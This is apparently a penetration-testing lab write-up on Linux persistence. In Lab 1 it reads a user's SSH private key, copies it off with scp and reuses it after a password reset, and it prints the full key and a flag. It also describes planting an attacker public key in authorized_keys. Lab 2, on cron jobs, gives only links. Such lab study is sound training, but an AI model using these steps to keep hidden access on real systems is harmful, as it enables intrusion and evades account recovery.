# ðŸ”¬Linux Persistence

## Lab 1 - SSH <a href="#lab-1-ssh" id="lab-1-ssh"></a>

> ðŸ”¬ [Maintaining access I](https://www.attackdefense.com/challengedetails?cid=954)
>
> * Target IP: `192.3.140.3`
> * **Persistence** via **SSH Keys**, even after user credentials are modified
> * Initial credentials: `student` :`password`

```bash
ifconfig
    192.61.149.3
```

```bash
ssh student@192.61.149.3
```

<figure><img src="../../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

### SSH Keys <a href="#ssh-keys" id="ssh-keys"></a>

```bash
ls -al
    total 24
    drwxr-xr-x 1 student student 4096 Aug  9 15:36 .
    drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
    drwx------ 2 student student 4096 Aug  9 15:36 .cache
    drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
    -rw-r--r-- 1 student student   91 Apr 26  2019 wait
    
cat wait
    Delete this file to trigger connection reset.
    
    Delete it only after planting the backdoor.
    
cd .ssh

ls
    authorized_keys  id_rsa
```

* Show the **private key** inside `id_rsa`

```bash
cat id_rsa 

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
    8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
    LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
    AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
    6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
    HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
    9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
    C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
    R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
    fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
    +U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
    2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
    0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
    TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
    rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
    oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
    TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
    OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
    oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
    vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
    tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
    326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
    OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
    lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
    59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
    -----END RSA PRIVATE KEY-----
```

* Check the [`authorized_keys`](https://www.ssh.com/academy/ssh/authorized-keys-file) file too

```bash
cat authorized_keys 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDckfXMLVYm4nYoI9/VR0l7V1f5SHhoT1Eqye5CTXbh44HrTX/z5Dq4l6PfyChVhDsNzgg0r0+r1w6z64NB9F2NLX/1LtrRsNU5FHpD8Td3JrREOzMtxqpfouQ+CcFnaBLfsTiZfqSLAS9h6poAbIWrJ+f5A8uiz9mdzcQDgDvUs8WDTVsCakjoZtprtRQb4wJmgzSoM2jkzOvlua0KdU4pDqfRDHvOe7kDanTRN/OYCjt6tnzrElR9dChUXOqYg2qFkoVm2OBXmeT+oeCfUE/J3o2hZ5cAN0gkqLuKriOiZP43L78eXGsCzUgmHG2tITFIxOSqYf/cp5f2JsFZfNjV root@localhost
```

### Persistence <a href="#persistence" id="persistence"></a>

* Exit the `SSH` session and download the `id_rsa` file

```bash
scp student@192.61.149.3:~/.ssh/id_rsa .
chmod 400 id_rsa 
```

<figure><img src="../../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

* Log back into the target system and trigger the password and connection reset

```bash
ssh student@192.61.149.3
rm wait
    Connection to 192.61.149.3 closed by remote host.
    Connection to 192.61.149.3 closed.
# Old student's password do not work anymore
```

* Connect to the target using the downloaded private key

```bash
ssh -i id_rsa student@192.61.149.3
```

<figure><img src="../../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
**Flag:** `689227a4f1b97afe1ff5ebaf85babc19`
{% endhint %}

> ðŸ“Œ Instead of using a user's private key, typically the attacker generates an SSH key pair on his system, keeps the private key on his system, transfers the public key onto the target system user's home `.ssh` directory and adds it in the `authorized_keys` file.
>
> * [SSH Penetration Testing](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)

***

## Lab 2 - Cron Jobs <a href="#lab-2-cron-jobs" id="lab-2-cron-jobs"></a>

> ðŸ”¬ [T1168: Local Job Scheduling](https://www.attackdefense.com/challengedetails?cid=1553)
>
> * Target IP: `192.175.36.3`
> * **Persistence** via **Cron Jobs**
> * Initial credentials: `student` :`password`
> * ðŸ”¬ Check the [Cron Jobs Linux attacks Lab here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/linux-attacks/cron)

* [Scheduled Task/Job - MITRE ATT\&CK](https://attack.mitre.org/techniques/T1053/)
* [crontab.guru](https://crontab.guru/)

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-cdd2252b21e631f7d116c274f50f7cef57193f43%252Fimage-20230429160832734.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=bc20cf3f&#x26;sv=1" alt=""><figcaption></figcaption></figure>
